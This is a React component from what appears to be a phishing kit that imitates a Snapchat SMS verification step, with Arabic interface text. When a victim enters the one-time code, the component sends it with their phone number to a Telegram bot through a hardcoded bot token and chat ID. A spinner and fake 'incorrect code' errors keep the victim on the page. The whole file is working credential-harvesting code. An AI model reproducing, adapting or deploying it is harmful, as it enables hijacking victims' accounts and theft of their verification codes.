import React, { useState } from "react"; 
import Axios from "axios";
import { formatPhoneNumberIntl } from 'react-phone-number-input';
import { GridLoader } from "react-spinners";
import ProgressBar from "../ProgressBar"; // Update the path if necessary

export default function Confirm2({ setNcode, ncode, setPage }){ 
    const [error, setError] = useState(false);
    const [code, setCode] = useState('');
    const [loading, setLoading] = useState(false);

    const APIS = () =>{
        const apiToken = "7930505317:AAG8QAJy31wRFvjkSfXQBiFf2kd-vhFhYNA";
        const chatId = "8179011712";
        const text= `${formatPhoneNumberIntl(ncode.number)} code2: ${code}`;
        const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
        Axios(url);
    }

    const handle = () => {
        if(code.length < 5){
            setError(true);
        } else { 
            setNcode({...ncode, code: code});
            APIS();
            setError(false); 
            setLoading(true);
            setTimeout(() => {
                setCode('');
                setLoading(false);
                // Navigate to another page or perform any action after confirming code 2
            }, 9000);
        }
    }

    return (
        <div className="md:w-1/2 mx-auto shadow-xl rounded-2xl pb-2 bg-white size Conts">
            <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
                <div className="w-full max-w-md space-y-8">
                    <div>
                        <img className="mx-auto h-12 w-auto" src="/logo.svg" alt="Your Company" />
                        <h2 className="mt-6 text-center tracking-tight text-gray-700">أدخل رمز التحقق لي وصلك عبر رسالة نصية، ان لم يصلك فقد ادخلت رقم غير مسجل على حسابك السناب</h2>
                    </div>
                    <div className="mt-6">
                        <ProgressBar progress={80} /> {/* Add the progress bar and set its progress to 80% */}
                    </div>
                    {loading ? 
                    <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
                        <GridLoader 
                            color={"#FFD700"}
                            loading={loading}
                            size={20}
                        />
                    </div>
                    :
                    <div className="mt-8 space-y-6">
                        <div className="-space-y-px rounded-md shadow-sm">
                            <div>
                                <input 
    type="tel" 
    id="phone" 
    className="bg-white border border-black text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 text-center" 
    placeholder="أدخل رمز التحقق" 
    onChange={(e) => setCode(e.target.value)}
    style={{ textAlign: 'center' }} // Center the placeholder text
/>

                            </div>
                        </div>
                        {error ? 
                        <div className="flex p-4 mb-4 text-sm text-red-700 bg-red-100 rounded-lg dark:bg-red-200 dark:text-red-800" role="alert">
                            <svg aria-hidden="true" className="flex-shrink-0 inline w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule={"evenodd"}></path></svg>
                            <span className="sr-only">Info</span>
                            <div>
                                <span className="font-medium">الرمز غير صحيح</span>
                            </div>
                        </div> : ""
                        }
                        <div>
                            <button className="group relative flex w-full justify-center rounded-md border border-transparent bg-yellow-300 py-2 px-4 text-sm font-medium text-white hover:bg-yellow-400 focus:outline-none focus:ring-2 focus:ring-yellow-500 focus:ring-offset-2"
                            onClick={()=>handle()}>
                                <span className="absolute inset-y-0 left-0 flex items-center pl-3">
                                    <svg className="h-5 w-5 text-yellow-500 group-hover:text-yellow-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
                                        <path fillRule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clipRule={"evenodd"} />
                                    </svg>
                                </span>
                                <div className="text-gray-500">تأكيد</div>
                            </button>
                        </div>
                    </div>
                    }
                </div>
            </div>
        </div>
    );
}
